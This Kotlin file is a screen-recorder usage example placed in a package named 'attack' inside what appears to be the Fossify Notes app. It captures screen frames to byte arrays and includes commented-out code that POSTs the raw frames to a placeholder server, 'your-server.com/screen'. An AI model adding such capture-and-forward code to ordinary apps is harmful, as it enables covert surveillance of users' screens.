package org.fossify.notes.attack

import android.app.Activity
import android.content.Intent
import android.media.Image
import android.util.Log
import android.widget.Toast

/**
 * ScreenRecorder 使用示例
 * 
 * 在 Activity 中使用录屏功能的示例代码
 */
object ScreenRecorderExample {
    private const val TAG = "ScreenRecorderExample"
    
    // 录屏请求码
    private const val REQUEST_MEDIA_PROJECTION = 1000
    
    
    /**
     * 创建录屏回调示例
     */
    fun createCallback(): ScreenRecorderCallback {
        return object : ScreenRecorderCallback {
            private var frameCount = 0L
            
            override fun onFrameCaptured(image: Image, width: Int, height: Int) {
                frameCount++
                
                // 示例1: 处理图像数据（转换为字节数组）
                val imageData = ImageProcessor.imageToByteArrayDirect(image)
                imageData?.let { bytes ->
                    // 这里可以转发数据，例如：
                    // - 通过网络发送
                    // - 保存到文件
                    // - 显示在 UI 上
                    Log.d(TAG, "接收到帧 #$frameCount, 大小: ${bytes.size} bytes, 分辨率: ${width}x${height}")
                    
                    // 示例：转发到服务器（需要实现网络发送逻辑）
                    // forwardToServer(bytes, width, height)
                }
                
                // 注意：如果使用 imageToByteArrayDirect，它会自动关闭 image
                // 如果使用 imageToByteArray，也需要确保关闭 image
                // 否则应该手动关闭：image.close()
                
                // 每 30 帧打印一次日志（避免日志过多）
                if (frameCount % 30 == 0L) {
                    Log.i(TAG, "已捕获 $frameCount 帧")
                }
            }
            
            override fun onRecordingStarted() {
                Log.i(TAG, "录屏已开始")
                frameCount = 0
                // 可以在这里更新 UI，例如显示录制状态
            }
            
            override fun onRecordingStopped() {
                Log.i(TAG, "录屏已停止，总共捕获 $frameCount 帧")
                // 可以在这里更新 UI，例如隐藏录制状态
            }
            
            override fun onError(error: String) {
                Log.e(TAG, "录屏错误: $error")
                // 可以在这里显示错误提示
            }
        }
    }
    
    /**
     * 网络转发示例（需要实现具体的网络逻辑）
     */
    private fun forwardToServer(imageData: ByteArray, width: Int, height: Int) {
        // 示例：使用 OkHttp 或其他网络库发送数据
        // val client = OkHttpClient()
        // val request = Request.Builder()
        //     .url("http://your-server.com/screen")
        //     .post(RequestBody.create(MediaType.parse("image/rgba"), imageData))
        //     .build()
        // client.newCall(request).enqueue(...)
        
        // 或者使用 WebSocket 实时传输
        // webSocket.send(imageData)
        
        Log.d(TAG, "转发数据到服务器: ${imageData.size} bytes")
    }
    
}

